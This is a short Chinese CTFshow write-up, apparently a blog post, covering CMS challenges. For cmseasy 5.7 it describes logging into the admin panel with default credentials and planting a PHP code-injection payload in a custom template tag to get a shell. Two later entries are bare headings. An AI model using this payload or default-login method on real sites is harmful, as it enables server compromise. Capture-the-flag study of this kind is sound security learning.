---
title: CTFshowCMS
abbrlink: 478f3262
date: 2022-06-08 22:06:21
tags:
---

**477**

cmseasy 5.7，百度搜搜漏洞，有后台getshell

首先/admin登录后台，admin:admin直接登录，在模版—自定义标签中写入payload

```
1111111111111";}<?php phpinfo();?>
```

环境变量里面找吧

**478**

phpcms 9.6.0

**479**
